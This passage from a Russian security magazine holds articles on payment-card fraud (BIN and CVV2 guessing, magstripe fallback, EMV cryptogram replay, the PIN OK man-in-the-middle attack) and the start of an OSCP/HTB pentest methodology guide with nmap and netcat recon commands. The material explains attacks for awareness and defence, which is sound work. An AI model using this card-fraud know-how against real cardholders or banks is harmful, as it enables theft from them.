ей неуспешной попытки чтения терминал точно предложит провести опе‐
рацию по магнитной полосе.
  В любом из этих случаев ответс твенность по правилам лежит на магазине,
выпол нившем такую высоко рисковую операцию. Тем более платежные сис‐
темы, такие как MasterCard, чтобы избежать имиджевых рисков, рекомендуют
отклонять транзакции, пришедшие  в режиме  technical  fallback. Никому
не хочется выяснять, была ли на самом деле у клиента украдена карта, или он
просто захотел не тратить деньги и объявить о мошенничес кой опе рации.
Еще меньше хочется объ яснять разоз ленным клиентам, почему по их картам
купили телевизоры за тысячи долларов и в сотнях километров от их реального
местоположения.


А что в России?
В России терминалы не должны принимать к оплате магнитную полосу, если
карта оснащена чипом. И даже technical fallback должен быть под запретом.
Однако есть неприятные исключения. На подпольных форумах недавно
обсуждали, что сеть «Ашан» имеет терминалы, при нимающие операции
по technical fallback. В любом случае, даже если хакеры не могут исполь‐
зовать русские карты в России, им никто не меша ет продавать эти данные
другим хакерам в Европе или Америке для дальнейшей монетизации.



Офлайновые транзакции по чипу и атаки на аутентификацию
По правилам современных платежных систем 99,9% операций по картам дол‐
жны совершаться онлайн — с подтверждением криптограммы на стороне
банка‐эмитента. Исклю чения — это метро, оплаты в самоле тах и на круизных
лайнерах. То есть там, где интернет доступен с перебоями либо нет воз‐
можности подолгу ждать ответа от банка‐эмитента, как, например, у тур‐
никетов метро. Да и когда соз давались протоколы EMV, множество платежных
систем работало в офлайне по так называемым Floor limit — операции выше
этих лимитов дол жны были подтверждать ся онлайн, а ниже — проходили
в локальном режиме, то есть подтверждались самим терминалом. Еще 5–
10 лет назад количество таких терминалов, особенно в странах Латинской
и Северной Америки было дос таточно велико, чтобы массово пытаться ата‐
ковать недостатки офлайновой аутентификации карт.


БЕЛЫЕ КИТЫ
Именно для защиты от массового и прос того мошенничес тва когда‐то были
изобретены карты с чипом и подтверждение транзакций с помощью кода
3‐D Secure. Эти методы защиты не идеальны, у них были свои проблемы,
о которых эксперты предупреждали с самого начала. Однако такие карты
до сих пор не удается массово взламывать, а когда атака получается, она
больше похожа на блицкриг — все происходит в считаные дни или часы.
Небольшая группа злоумышленников получа ет максимум при были и исчезает
с горизонта. Именно поэто му каж дый случай или новая схема вызывают
у экспертов большой интерес.
   Такие случаи мы будем называть белыми китами. Это инциденты, которые
случаются раз в 5–10 лет, заканчиваются катас трофой для атакуемых банков
и многомилионными прибыля ми для ата кующих и поэтому привлекают к себе
очень много внимания со стороны прессы и регуля торов. Я расскажу о нес‐
кольких видах подоб ных атак, что бы наглядно проиллюстрировать фундамен‐
тальные недостатки технологий карточных платежей.


Распределенные атаки на подбор карточных реквизитов
Такие атаки часто называ ют BIN Master attack или distributed guessing attack.
Эти названия они получили благода ря самому громкому случаю, который
произошел в 2016 году. Тог да английский банк Tesco подвергся распре‐
деленной атаке такого масшта ба, что им пришлось выключить карточные пла‐
тежи  на  48  часов.  За  нес колько  дней  злоумышленни кам  удалось
украсть 22 миллиона фунтов с 20 тысяч карт. Как уже упоминалось, эти дан‐
ные легко могут исполь зовать ся для оплаты в интернет‐магазинах, не осна‐
щенных 3‐D Secure. Одна ко тут есть нюанс: в 2018 году регуля тор оштра‐
фовал банк на 16 миллионов фунтов за атаку 2016 года, — скорее все го,
это указывает на то, что сами карты не были осна щены 3‐D Secure.


             INFO

                     Правила, называемые 3‐D Secure  Liability  shift,
                      определяют  ответствен ную  сторону  в  случае
                    мошеннических операций: если банк не оснащает
                       карты 3‐D Secure, ответственность за мошен‐
                       ничество лежит на банке. Если карты, оснащен‐
                     ные 3‐D Secure, используют ся, например, в Ama‐
                          zon,  где  данная  технология  не применяется,
                         ответствен ность лежит на интернет‐магазине.



Как хакеры подбирают полные реквизиты карт?
Предположим, у нас есть одна карта — наша. Ее номер состоит из нескольких
частей. Первые шесть цифр называются BIN — bank identiﬁcation number.
Один и тот же BIN при этом может принадлежать более чем одному банку,
кроме того, у банка может быть нес колько BIN Range. Однако это главная
отправная точка, от которой и пошло название ата ки. Пос ледняя циф ра также
вычисляется по алгоритму контроль ной суммы «Луна».
  Предположим, наша карта имеет номер 1234 5678 1234 5670. Следующая
карта из этого диапазона, согласно алгоритму, будет заканчиваться на 5688,
затем 5696 и  так  далее.  Есть ненулевая веро ятность  того,  что  кар‐
ты 5688 и 5696 существу ют и активны.
   Теперь необходимо выяснить значение поля Expiry Date. Если банк выдает
номера карт последова тельно, то, значит, следующий клиент банка, которому
выпустили карту после тебя, будет обла дать номером 5688. Если банк боль‐
шой и открывает сотни карт каждый день, скорее всего, поле Expiry Date сов‐
падет с таковым на твоей карте либо будет отличаться на один месяц.
Для защиты от подоб ного подбора зна чений пла тежные сис темы рекомен‐
дуют внедрять рандомизацию PAN — выдавать их не пос ледовательно, а слу‐
чайно. Тогда хакерам будет сложнее узнать Expiry Date карты 5688.
  Но нерешаемых задач нет. Существует множес тво банковских сервисов,
которые помогают подобрать связку полей PAN / Expiry Date. Среди них —
система восстановления пароля или логина мобильного банка, регистрация
в системе ДБО, возврат денежных средств в платежном эквайринге.
  И наконец, осталось угадать три цифры с обратной стороны карты —
CVV2/CVC2. В конце 2014 года, когда исследователи из Университета
Ньюкасла впервые про вели ана лиз атаки на банк Tesco, они обнаружили,
что 291 из 400 самых популярных онлайновых сервисов дает возможность
перебирать поле CVV2. Это неудивительно: ведь день ги не принадлежат вла‐
дельцам этих сервисов. Сервис — лишь инстру мент для атакующе го. Значит,
у злоумышленников всегда будет достаточно инс трументов для перебора
реквизитов банковских карт. Например, в 2019 году подобная уязвимость
была устранена в платежном модуле Magento CMS для PayPal.
  Другая часто применя емая злоумыш ленниками разновидность этой ата‐
ки — это использование подоб ранных реквизитов для выпуска мобильного
кошелька Google Pay или Apple Pay. Иро ния заключается в том, что один
из самых громких случаев мошенничества был направлен на сами магазины
Apple. Дело в том, что множество банков (опять‐таки в Америке) не требуют
дополнительной верификации с помощью одноразового кода или звонка
в банк при выпуске мобильного кошелька Apple Pay. Это означает, что, зная
только номер карты, срок ее действия и код CVV2, можно выпустить пол‐
ноценную виртуальную карту, с помощью которой уже можно расплачиваться
по всему миру, а не только в США.
  Существует еще одно средс тво защиты платежей категории card‐not‐
present. Оно называется address veriﬁcation system. В этом слу чае при совер‐
шении платежа платежная система сверяет еще и цифры из почтового
индекса и адреса, по которо му зарегистрирова на карта (postcode / billing ad‐
dress). Такой же системой могут быть осна щены пла тежные терминалы, под‐
держивающие метод PAN Key Entry (о нем я рассказывал в прошлой статье).


ЗАКЛЮЧЕНИЕ
По оценкам Positive Technologies, до 50% банков до сих пор не защищает сво‐
их клиентов от подбора зна чений CVV2 и Expiry Date. Именно поэтому трудяги
из стран Латинской Америки так активно занимаются поиском по всему миру
карт и банков, уязвимых к данным атакам.
  О других «белых китах» карточного мошенничества я расскажу в сле‐
дующий раз.
COVERSTORY





                                                                          Тимур Юнусов



      БЛИЗКИЕ
 КОНТАКТЫ

                   КАК РАБОТАЮТ АТАКИ
                  НА ЧИПОВЫЕ КАРТЫ





Практичес ки все современные банков ские карты снабжены
специальным чипом, на котором хранится необ ходимая
для платежей информа ция. В сегодняшней статье я расска‐
жу о способах мошенничества с такими картами, а так же
о применяемых бан ками методах противодействия кар‐
дерам.


             INFO

                 О принципах, на которых строится безопасность
                      банковских платежных систем, ты можешь узнать
                        в статьях «Разбираемся, как работают системы
                       безопасности кредитных карт» и «Как хакеры кра‐
                         дут деньги с бан ковских карт».



ЧИПОВОЕ ЛЕГАСИ
Один из видов информа ции, содержащейся на чиповой карте, — это так
называемый Track2 Equivalent. Он практичес ки один в один повторяет содер‐
жимое магнитной полосы и, скорее всего, служит в качестве параметра иден‐
тификации карты в системах HSM и других подсистемах карточного процес‐
синга. Один из видов атак, которые время от времени проводятся злоумыш‐
ленниками, подразумевает запись данных Track2 Equivalent на магнитную
полосу, после чего мошенничес кие операции про водятся либо как обычные
транзакции  по  магнитной  полосе,  либо  в  режиме  technical  fallback.
Для хищения таких данных из банкоматов используются так называемые шим‐
меры.





 Шиммер — устрой ство для незаметного снятия данных при исполь‐
  зовании чиповых карт в банкоматах

В одной из статей о шимминге упоминается, что в 2006 году, в самом начале
выпуска чиповых карт, в Великобритании поле Track2 Equivalent содержало
в себе оригинальный CVV2/CVC2. Из‐за этой ошиб ки было легко создавать
клоны магнитных полос карт, по которым оплата происходила с помощью
чипа.  Тогда  платежные  системы  решили  использовать  разные  seed
при генерации полей CVV2/CVC2 на магнитной полосе и в поле Track2 Equiv‐
alent.  Казалось  бы,  задача  решена —  зна чение  секретного  поля
CVV2/CVC2 на магнитной полосе не совпадает с тем, что записано на чипе.
Но шимминг жив и по‐преж нему процвета ет. Почему?
  Многие банки до сих пор одоб ряют транзакции со счи танными с чипа зна‐
чениями CVV2/CVC2! Об этом час то упоминает Visa и почти не пишет Master‐
Card. Одна из причин, по моему мнению, — практически во всех картах Mas‐
terCard CVC2 в Track2 Equivalent равен 000. Для русских карт это также неак‐
туально: среди протестированных мной за два года десятков банков я
не нашел ни одной карты, где эта ата ка была бы воз можна. Тем не менее сто‐
ит отметить, что подоб ные ата ки популярны в Америке.


             INFO

                   Одна из немногих карт MasterCard, с которой мне
                       удалось воспроизвести эту атаку, принадлежала
                      банку, вообще не проверявшему значение поля
                     CVC2. Я мог под ставить туда что угодно — 000,
                     999 или любые другие варианты между этими
                       числами. Скорее всего, в этом банке не был
                      отключен режим отладки, одобряющий любые
                        транзакции.
                      Чем это чревато? Хакер мог бы подменить поле
                   Service  Code,  указывающее,  что  карта
                      не содержит чипа, и сверка целостности этого
                       поля была бы невозможна, потому что любой
                   CVC2  принимался  процессингом.  Уязвимость,
                       очень сильно похожая на следующую в списке,
                     была быстро устранена после письма в банк.


По моей статистике, 4 из 11 карт были под верже ны подоб ным ата-
кам.


БРАЗИЛЬСКИЙ ХАК
Под этим термином понимают нес колько видов атак, в том числе атаку
на офлайн‐терминалы, описанную «Лабораторией Касперского». О самой
массовой атаке c таким наз ванием рас ска зывал Брайан Кребс. В чем суть
нашумевшей атаки?
  В начале 2010‐х чиповые карты наконец‐то получили широкое рас‐
пространение в США. Несколько банков начали выпускать такие карты. Стоит
заметить, что до сих пор самая распростра ненная чиповая схема в США —
это не Chip & PIN, а Chip & Signature. Владельцу подобной карты не надо вво‐
дить ПИН‐код, а нужно только вста вить карту в считыватель и подтвердить
транзакцию подписью на чеке. Почему эта схема так прижилась — расскажу
дальше.
   Как мне кажется, где‐то в этом процес се произошла инсайдерская утечка
информации, и хакеры узна ли, что чиповая транзакция вроде и проходит,
но не проверяется на сто роне банка‐эмитента. Банк прос то брал поле Track2
Equivalent и проводил идентификацию, как если бы это была обычная тран‐
закция по магнитной полосе. С нес колькими нюансами: ответственность
за мошенничество такого рода по новым правилам EMV Liability Shift теперь
лежала на банке‐эмитенте. А банки‐эмитенты, не до  конца  понимая,
как работали такие карты, не вводили сильных ограничений на «чиповые»
транзакции и не использовали системы антифрода.
  Быстро сообразив, что из это го можно извлечь выгоду, кардеры стали
открывать мерчант‐акка унты и, используя куп ленные на черном рынке данные
магнитных полос Track2, совершали сотни транзакций «чипом». Расследова‐
ние заняло годы, и к моменту его окончания мошенники уже скрылись. Суммы
потерь не разглашаются, однако очевидно, что они были существенными.
Самое печальное, что с тех пор жители стран Латинской Америки ры щут
по всему свету в поисках «белых китов» и активно тестиру ют банки, пытаясь
найти другой такой же неотключенный отладочный интерфейс.


CRYPTOGRAM REPLAY И CRYPTOGRAM PREPLAY
«В дикой природе» подобная атака наб людалась лишь единожды. Она была
задокументирована и описана (PDF) в исследовании известных специалис тов
из Кембриджского университета.
   Суть атаки заключается в обхо де механизмов, обес печивающих уникаль‐
ность каждой транзакции и крип тограммы. Атака позволя ет «клонировать
транзакции» для дальнейшего использования уже без доступа к оригиналь‐
ной карте. В первой части уже рас сказыва лось, что на входе карта получает
определенный набор данных: сумму, дату транзакции, а также два поля, обес‐
печивающих энтро пию, даже если сумма и дата одинаковые. Со стороны тер‐
                    32минала энтропию 2  обеспечивают 4 бай та поля UN — случайного числа.
Со стороны карты — ATC‐счетчик операций, увеличивающийся каждый раз
на единицу. Псевдофункция выг лядит примерно так:


Cryptogram=Signature(ATC,UN,Amount,Misc,SecretKey)

Если одно из полей меняется, изменяется и выходное значение криптограм‐
мы. Однако что произойдет, если все поля оста нутся прежними? Значит,
и прежняя криптограмма останется валидной. Из этого следуют две воз‐
можности атак на чиповые транзакции.
  Cryptogram Replay. Если скомпромети рованный терминал выдает одно
и то же поле UN, однажды считанная с карты криптограмма с переданным
предсказуемым полем UN может использовать ся сколько угодно раз. Даже
на следующий день зло умышленники могут переда вать информацию о ста‐
рой криптограмме со старой датой в зап росе на авторизацию, и это не при‐
ведет к отказу. В моих прошлогодних тестах я повторил одну и ту же крип‐
тограмму семь раз на протяжении семи дней, и это не вызвало никаких
подозрений у банка.





                   Схема атаки Cryptogram Replay

Cryptogram Preplay. Эта схема исполь зуется, если уяз вимый терминал
возвращает не один и тот же UN, но выда ет их предсказуемыми. Именно так
работал уязвимый банкомат в описанной выше маль тийской атаке. В таком
случае злоумышленник при физичес ком дос тупе к карте клониру ет несколько
транзакций «на будущее». В отличие от первой атаки, каждая транзакция
может использоваться только один раз.
   Эта атака интересна с историчес кой точки зрения раз вития протокола
EMV. Когда протокол создавался, поле ATC было соз дано специально
для защиты от подоб ных атак.
   Банк‐эмитент дол жен был проверять значение поля ATC, и, если эти зна‐
чения приходили не по порядку, с заметными скачками, подозрительные
транзакции отклонялись.
  Например, если на про цес синг пос тупали транзакции значением ATC
0001, 0002, *0008*, *0008*, *0008*, 0009, 0010, *0003*, *0004*, то
операции, номера которых выделены в этой последовательности, должны
были считаться подозритель ными и откло няться процессингом. Но затем
начали поступать жалобы от клиентов, и в технологию были внесены кор‐
рективы.
   Рассмотрим пример: клиент банка садится в самолет, расплачивается
в самолете картой с использованием офлайн‐терминала. Далее самолет
приземляется, и клиент рас плачивается картой в отеле. И только пос ле этого
используемый в самолете терминал подключается к сети и передает данные
о транзакциях. В таком случае будет зафиксирован скачок ATC, и, следуя пра‐
вилам платежных систем, банк мог бы отклонить абсо лютно легитимную тран‐
закцию. После несколь ких подоб ных эпизодов пла тежные системы внес ли
коррективы в их требования по «скачкам ATC»:
 • скачки должны считаться, только если дельта меж ду значени ями счетчика
  «выше Х», где значение Х каждый банк должен определять инди видуально;
 • скачки не обязательно служат признаком мошенничес тва, однако пос‐
   тоянные скачки выше значения Х — это повод свя заться с клиентом
   для выяснения обстоятельств.

При этом за бортом изменений остался первый сценарий — cryptogram re‐
play. Если карточный процессинг спроекти рован корректно, нет ни одного
разумного объяснения ситуации, когда один и тот же набор данных (Cryp‐
togram, UN, ATC) поступает на вход много раз и успешно одобряется банком.
За последний год я отпра вил информацию об этой атаке более чем в 30 раз‐
ных банков и получил дос таточно широкий спектр ответов.
  В некоторых случаях неп равиль ное про екти рование сервисов процес‐
синга приводит к тому, что банк не может просто заблокировать операции
с одинаковыми значениями. Также стоит отметить, что в «дикой природе» я
не встречал терминалы, которые возвращали бы одинаковое значение поля
UN. То есть злоумышленникам приходится исполь зовать их собственные тер‐
миналы, что делает отмывание денег более сложным.
  Кроме того, даже офлайн‐аутентифика ция не всегда помогает: ее можно
обойти либо предположить, что источник UN скомпрометирован и в ней.
В этом случае можно заранее высчитать резуль тиру ющие значения схем
аутентификации DDA/CDA для предска зуемого поля UN.
   Статистика показывает, что 18 из 31 бан ковской карты под верже ны
атакам replay/preplay в отно шении контактного или бесконтактного чипа.
При этом в России я не смог найти ни одно го уязвимого для этого типа атак
банка, что крайне любопытно.


PIN OK
Пожалуй, это самая извес тная атака на чипы. Первые теоретические пред‐
посылки к этой атаке команда из Кембриджа описала в 2005 году в иссле‐
довании Chip and Spin, за год до того, как стандарт EMV получил распростра‐
нение в Великобритании. Но повышенное вни мание к этой атаке возникло
гораздо позднее.
  В 2010 году выходит полноценное исследование кембриджской четверки,
посвященное атаке PIN OK. Для этой атаки они использовали устройство,
реализующее технику «человек посередине» между чипом карты и ридером
терминала.





        Устройство для реализации техники «человек посере дине»

В 2011 году на конференциях Black Hat и DEFCON группа иссле дователей
из Inverse Path и Aperture Labs предста вила боль ше информации об этой ата‐
ке. Тогда же, в 2011 году, орга низованная прес тупная группировка исполь‐
зовала 40 украденных банковских карт для совершения 7000 мошеннических
транзакций, в результате которых было укра дено 680 тысяч евро. Вместо
применявшегося исследователями громоз дкого устрой ства преступники вос‐
пользовались  маленьким  незаметным  «вторым  чипом»,  установленным
поверх оригинального, что позволяло эмулиро вать атаку в реальных усло‐
виях.
  В декабре 2014 года исследователи из Inverse Path снова подняли тему
атак на транзакции EMV и представили немного ста тистики, собранной ими
за три года (PDF). В 2015 году было выпущено детальное техничес кое иссле‐
дование  атаки   (PDF),  совершенной  неизвес тными  злоумышленниками
в 2011 году.
  Давай рассмотрим техничес кие детали этой ата ки. Для ее реализации,
напомним, нужно использовать технику man in the middle. Карта передает тер‐
миналу поле CVM  List (Сard Veriﬁcation Method) — приоритетный список
методов верификации владельца карты, поддерживаемых картой. Если пер‐
вое правило на карте «офлайн‐ПИН шифрованный/нешиф рованный», на этом
этапе ничего не происходит. Если первое правило другое, то во время атаки
первое правило подменяется на «офлайн‐ПИН».
  Затем терминал запрашивает  у владельца карты ПИН‐код. Правило
«офлайн‐ПИН» означает, что ПИН‐код будет передан карте для сверки
в открытом или шифрованном виде. В ответ карта либо ответит 63C2 «Невер‐
ный ПИН, осталось две попыт ки», либо 9000 «ПИН ОК». Именно на этом этапе
злоумышленник, внедрившийся в процесс авторизации, заменит первый
ответ вторым.
  На данном этапе терминал считает, что ПИН введен корректно, и зап‐
рашивает у карты криптограмму (запрос Generate AC), передавая ей все зап‐
рашиваемые поля. Карта знает, что ПИН либо не введен совсем, либо вве ден
некорректно. Но при этом карта не зна ет, какое решение дальше при нял тер‐
минал. Например,  есть  терминалы, которые при вводе некорректного
ПИН‐кода просят держателя карты пос тавить подпись на тачс крине — дела‐
ется это для его же комфорта. Поэто му, когда терминал запрашивает крип‐
тограмму, карта отдает ее. В ответе содержится поле CVR — Card Veriﬁcation
Results, которое указыва ет, был ли про верен ПИН‐код картой или нет. Более
того, это поле является частью платежной криптограммы, и подменить его
значение злоумышленникам не удас тся: попытка приведет к ошибке сверки
криптограммы на HSM.
   Терминал отсылает все данные в пакете ISO 8583 Authorization Request
банку‐эквайеру, затем они пос тупают банку‐эмитенту. Банк видит два поля:
CVMResults, которое указывает, что в качес тве метода верификации был выб‐
ран офлайн‐ПИН и что терминал поддерживает этот метод верификации.
Но еще банк видит, что карта НЕ приняла ПИН‐код либо что он был введен
некорректно. И несмотря ни на что, одоб ряет транзакцию.
   Если карта использует схему аутентифика ции CDA и злоумышленникам
необходимо подменить первое пра вило CVM  list, офлайн‐аутентификация
будет завершена с ошибкой. Одна ко это всегда обходится подменой полей
Issuer Action Code. Подробнос ти данного случая описаны в последней версии
презентации от 2014 года экспертами из Inverse Path.
   Также в первом исследовании от 2011 года специалисты показали, что
стандарт EMV позволяет не откло нять транзакции на платежном устройстве,
даже если безопасные методы аутентификации и верификации не сработали,
а идти дальше, каждый раз выбирая менее безопас ные методы (так называ‐
емый fallback). Это открывает перед зло умышленниками другие воз можнос ти,
вклю чая атаки на похищение ПИН‐кода во время операций на скомпромети‐
рованных POS‐терминалах.


ЗАКЛЮЧЕНИЕ
Интересная статистика за пос ледний год: нес мотря на то что еще в 2010‐м
«настоящие безопасники» из банков уми лялись тому, как кто‐то не сле дит
за очевидными проб лемами карточного процессинга, в 2020 году все при‐
мерно  так же пло хо. Статистика проверок за прошлый год показала,
что 31 из 33 карт банков с разных уголков Земли, включая российские, уяз‐
вима к этой атаке.
  В следующей статье я рассмотрю схемы атак на бесконтактные карты
и связанные с ними приложения — мобильные кошель ки.
ВЗЛОМ
ПЕНТЕСТ
     ПО-СВОЕМУ





                                         Евгений Грязнов
                                                  evgeniy@graznov.ru





  СОЗДАЕМ СОБСТВЕННУЮ МЕТОДИКУ
      ТЕСТИРОВАНИЯ НА ПРИМЕРЕ
    МАШИН С OSCP И HACK THE BOX




Каждому начинающему пентестеру или просто энтузиасту
мира ИБ однажды хочется перейти от чтения захватывающих
райтапов к практике. Как же лучше это сде лать и на что обя‐
зательно стоит обратить внимание? В этой статье я расска‐
жу о своем пути и поделюсь некото рыми из своих наработок.


Райтапы по HTB или CTF‐машинам сродни хорошему детективу. Опытный
пентестер быстро находит уяз вимость, пишет скрипт для ее эксплу атации,
и вот уже заветный флаг у нас в руках! Однако в реальности этот процесс
со всеми удачными и неудачными попытками может занять от нескольких
часов до нескольких десят ков дней. Об этом не принято писать в райтапах,
ведь сам поиск далеко не такой красочный. Как же в реальнос ти находятся те
самые «правильные места» и как узнать, на что сто ит обратить внимание?
Для этого у большинства серь езных пентестеров есть собственная методика
или список чек‐листов.


             INFO

                      Вся информация, приведенная в статье, собрана
                        автором  во  время  прохождения  лаборатории
                  OSCP и машин с HTB. При реальном пентесте
                     многие вещи могут работать иначе, и это стоит
                      обязательно учитывать! Если ты слышишь о OSCP
                      впервые,  просто  прочитай  статью  о  самом
                       популярном экзамене.


Типичный процесс исследования любой машины разделен на несколько эта‐
пов.
 1. Сканирование и сбор информа ции (Scanning).
 2. Определение уязвимостей (Enumeration).
 3. Эксплуатация уязвимостей (Exploitation).
 4. Повышение привилегий (Privilege Escalation).
 5. Постэксплуатация (Post Exploitation).
 6. Очистка следов (House Cleaning).

Пройдемся по ним, чтобы понять, как эффективнее действовать на каждом.


СКАНИРОВАНИЕ И СБОР ИНФОРМАЦИИ
Первое, что тебе необ ходимо сделать, — это привес ти исследуемую машину
в исходное состояние. Для этого во всех сервисах есть опция Revert или Re‐
set. Собирать информацию, не вернув машину в исходное состояние, не сто‐
ит: там могут не найтись нужные файлы или в общедоступной папке на FTP
уже может лежать готовый экспло ит, что испортит тебе все удовольствие
и возможность получить опыт.
   Что еще хуже, некото рые экс пло иты вроде перепол нения буфера могут
сработать ровно один раз, и, сканируя такую машину, ты просто не найдешь
нужный сервис. Поэтому всегда воз вра щаем машину в исходное состояние!
В HTB стараются не делать таких сервисов, но там тоже можно проголо‐
совать за Revert или переза пус тить машину самому, если у тебя есть статус
VIP.


Сканирование портов
Споры о правильных способах сканирования портов не утихают никогда.
Существует много разных скриптов вроде Autorecon, nmapAutomator, они
очень полезные, но я не рекомендую начинать с них. Почему? Всегда лучше
понять, как работает та или иная ути лита, а не слепо полагаться на нее.
Поэтому лучше скачай их и пос мотри исходный код, а мы будем использовать
старый добрый Nmap.
  Для начала можно прой тись быс трым ска нировани ем популярных портов:


$ nmap x.x.x.x ‐v ‐‐top‐ports 10 –open

Если вдруг Nmap возвращает ошибку о недоступности хос та, попробуй
опцию ‐Pn. Пока ты размышля ешь над полученной информацией, можно
запустить полное сканиро вание всех TCP‐портов.


$ nmap x.x.x.x ‐p‐ ‐v ‐sV ‐‐reason

Не забудь, существуют еще порты UDP! Командную строку для их сканиро‐
вания я оставлю тебе в качес тве домаш него задания.


             INFO

                   Помни: даже некото рые лабораторные машины
                        могут иметь защиту от сканирования. Если вдруг
                        в середине сканирования все внезапно прер‐
                       валось или зависло, поиграй с опциями Nmap.
                     Например, увеличь время между пробами портов
                      и уменьши количество одновременных проб.


В результате всех этих действий у тебя будет информация о дос тупных
на машине портах.





                  Результат ска ниро вания портов

Не бросайся сразу же искать экс пло ит для VMware или Samba! Ты совершишь
самую большую ошибку и рискуешь попасть в так называемые кроличьи норы
(Rabbit Holes). Тупиковые мес та, которых страш но боятся все на экзамене
OSCP: ты можешь потратить часы в попытках сломать, например, WordPress
и в конце не добиться результата, поскольку уязвимость была в другом сер‐
висе, но ты до него просто не дошел.
   Твоя задача — соб рать весь список открытых портов и воз можных сер‐
висов, которые работают за ними. Пос ле этого переходим к дальнейшему
сбору информации.
   Как улучшить свои навыки ска нирования? Читай райтапы, смотри, какие
в них используются инс трументы, и пополняй свою копилку. Рекомендую
завести отдельный репозиторий с документами и там планомерно соз давать
собственную методику. У меня в разделе «сканирование портов» сейчас око‐
ло десятка разных способов ска нирования (Nmap, masscan, скрипты и дру‐
гие).
  Особо обрати внимание на любые порты, которые Nmap не смог
однозначно идентифицировать. Также — порты, о которых ты не знал раньше,
и на привычные вещи вроде веб‐серверов и FTP на нестандартных портах
вроде 9000, 5000 и других. Обычно это перспективные с точки зрения эксплу‐
атации сервисы, которые прос то хотели спрятать от быстрого сканирования.
Именно поэтому я рекомендую всегда про водить полное сканирование всех
портов TCP и быстрое — базовых UDP. Мне встречались машины, где уяз‐
вимый сервис был спрятан в UDP.


Сервисы
В этом разделе я приведу примеры нес кольких популярных портов и расска‐
жу, на что обязательно стоит обра щать внимание при исследовании каждого.


21-й порт
Мне очень нравится проверять информа цию о любых, особенно неизвестных
портах на сайте speedguide.net. На экза мене это даже помогло мне взять
одну из машин!
   Как видно, порт 21 обычно отвечает за FTP, но за ним может находиться
любой из известных тебе FTP‐сервисов, а может и не FTP вообще. Вдруг
какой‐то хит рый админ перевесил туда SSH? Поэтому первое, что я всегда
делаю, — пробую подключиться к сервису с помощью netcat.


$ nc ‐nv x.x.x.x 21

Чаще всего тебя встретит баннер FTP‐сервера, вроде такого.





                   Пример ответа FTP‐сер вера

Но если увидишь там ответ SSH или иного сервиса, просто запиши это и
переходи к соот ветствующему разделу, чтобы понять, что еще оттуда можно
добыть!
  На что следует обратить внимание при исследовании FTP:
 • название программы‐сервера и ее версия;
 • разрешен ли анонимный доступ;
 • нет ли чего‐то интересного в папках на сервере;
 • не разрешена ли запись в какую‐нибудь папку;
 • есть ли уязвимости в этой версии сервера.

 1. Версию FTP тебе покажет nc, либо можно попробовать узнать ее через
  Nmap:


   $ nmap ‐A ‐v x.x.x.x ‐p21

  В сети есть множество программ, которые пыта ются эвристически опре‐
   делить версию FTP‐сервера, можешь использовать их.
 2. Теперь подклю чись к серверу стандартным FTP‐клиентом и проверь ано‐
  нимный доступ. Обычно это guest, ftp, anonymous. Если получи лось —
   отлично. Если нет, не отча ивайся — возможно, ты найдешь учетные дан‐
  ные позже или сервис вообще не понадобится.
 3. Если удалось попасть на FTP, осмотрись. Это может быть прос то пустая
   папка, а может каталог веб‐сервера, запиши это. Иногда находятся
   какие‐нибудь файлы — складируй их для дальнейшего изу чения. Кстати,
  самое время найти и записать себе команду для рекурсивного скачивания
   всех файлов с FTP! Ты же не собира ешься пос тоянно делать это по одно‐
   му?
 4. Проверь, можешь ли ты записать в пап ку хоть что‐то. Удобно сделать
   это командой put. Но помни, иног да сервер дает право записи, но не уда‐
   ления! Не клади туда ничего ценного, лабора торные машины дос тупны
   всем.
 5. Время поискать уязвимос ти. Самый прос той и разрешенный в OSCP спо‐
   соб — использовать скриптовые воз можнос ти Nmap. С них стоит начинать
   всегда независимо от того, какой порт ты изу чаешь. Давай узнаем, какие
   есть скрипты для FTP, и запус тим их все сра зу. (Кстати, так за тебя делает
   nmapAutomator.)


$ ls ‐la /usr/share/nmap/scripts/ftp*
$ nmap ‐‐script ftp‐* ‐p21 x.x.x.x

Нашлись возможные уязвимости? Отлично! Запиши их себе, но не бросайся
сразу же пробовать! У нас еще столько непроверенных портов. Ты же
не хочешь попасть в кроличью нору? Но если больше ничего не нашлось —
тоже не беда! В разделе «Поиск уязвимос тей» я рас скажу, где еще их можно
поискать.
   Вот небольшой список того, что мне встречалось на FTP в лабораториях
и HTB.
 • FTP‐сервер, уязвимый к переполнению буфера.
 • Доступ к полному содержимому диска C, где удалось найти конфигура‐
   ционные файлы с логинами к дру гому сервису.
 • Возможность записать файл в директорию веб‐сервера для дальнейшего
   выполнения кода.
 • Directory Traversal (возможность читать файлы не только из папки FTP‐сер‐
   вера).
 • И еще многое другое! Не забывай дописывать к своей методике удачные
   ходы.


22-й порт
Обычно это порт SSH, но мы же не доверяем чис лам! Проверь его с помощью
nc.


$ nc ‐nv x.x.x.x 22




                      Пример ответа SSH

Отлично, это точно SSH! Видишь версию пакета? OpenSSH_8.2p1. Дальше
слова Ubuntu‐4ubuntu0.1 говорят нам о том, что это, скорее все го, Ubuntu.
Поискав в Google «openssh 8.2p1 4ubuntu0.1 version», мы можем с большой
долей уверенности сказать, что это версия Focal 20.04. Запиши эту информа‐
цию, возможно, она пригодится.
   Теперь нужно получить отпечаток (ﬁngerprint) для SSH.


$ ssh root@x.x.x.x

Для чего нам эта информа ция? Например, посмотреть, нет ли для этого отпе‐
чатка известного приватного ключа SSH. Обязатель но прочитай об уязвимых
клю чах SSH.
   Теперь осталось самое интерес ное и сложное. Научись понимать рас‐
ширенный вывод SSH. Для это го просто запусти SSH с ключом ‐v.


$ ssh root@x.x.x.x ‐v

Сначала ты можешь быть шокирован размером появившегося текста, но он
крайне важен! Изучи его.
  Почему это так важно? В лаборатории и HTB очень час то встречались
машины со старым SSH‐сервером, к которо му отказывается подключаться
свежий Kali, так как он будет считать алгоритм шифрования устаревшим и не
отдавать ключ через SSH, а сервер, выпущенный в 2014 году, считает его
вполне безопасным. Тог да без опции ‐v ты просто получишь отказ в дос тупе,
но никогда не узнаешь почему, а дос таточно было просто добавить пару
опций в строку подключения. С таким я тоже сталкивался, и это один
из популярных вопросов на форуме сту дентов. В общем, внимательно изучи
вывод SSH с клю чом ‐v и обязательно в нем разберись!
   Если у тебя есть список логинов и паролей, можешь попробовать подоб‐
рать их, например программой Hydra. Как и всегда, запиши эти знания
и опробуй их в своей методике! И если нашел в чьем‐то райтапе интересные
способы работы с SSH, тоже обязательно разберись и добавь их себе!
   Что интересного встречалось мне при работе с SSH?
 • Те самые «плохие» ключи SSH, которые можно определить и подобрать
   по отпечатку.
 • Уязвимые ключи, которые мож но подоб рать по отпечатку публичного клю‐
   ча.
